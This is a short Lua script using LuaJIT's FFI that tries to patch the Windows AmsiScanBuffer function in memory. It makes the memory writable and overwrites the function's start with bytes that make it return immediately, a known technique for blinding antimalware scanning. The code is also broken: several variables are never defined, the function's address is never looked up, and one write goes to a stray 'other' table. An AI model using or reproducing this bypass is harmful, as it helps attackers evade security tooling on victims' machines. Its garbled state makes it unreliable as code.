local ffi = require("ffi")
local lib = ffi.load("amsi")
local api = "AmsiScanBuffer"
local ptr = ffi.cast("uint8_t*", export)
win.VirtualProtect(ptr, 32, 64, old)
ptr[0] = 49 other[1] = 192 ptr[2] = 195
